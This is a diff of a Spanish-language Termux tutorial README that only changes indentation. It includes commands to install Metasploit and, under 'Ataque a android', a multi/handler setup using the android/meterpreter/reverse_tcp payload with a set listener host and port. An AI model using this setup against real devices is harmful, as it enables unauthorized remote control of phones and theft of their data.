@@ -11,9 +11,9 @@ la instalacion de texmux la encuentra [aqui][aqui]
 
 ### instalacion de Metasploit:
 ```shell    
-    apt update && apt upgrade
-    pkg install unstable-repo
-    pkg install metasploit
+apt update && apt upgrade
+pkg install unstable-repo
+pkg install metasploit
 ```
 
 ### Ataque a android
@@ -38,13 +38,13 @@ abrimos la consola de metasploit:
 
 preparamos metasploit:
 ```shell    
-    use multi/handler
+use multi/handler
     
-    set payload android/meterpreter/reverse_tcp
+set payload android/meterpreter/reverse_tcp
     
-    set lhost 192.168.1.2
+set lhost 192.168.1.2
     
-    set lport 4444
+set lport 4444
 ```
 
 ejecutamos el exploit:
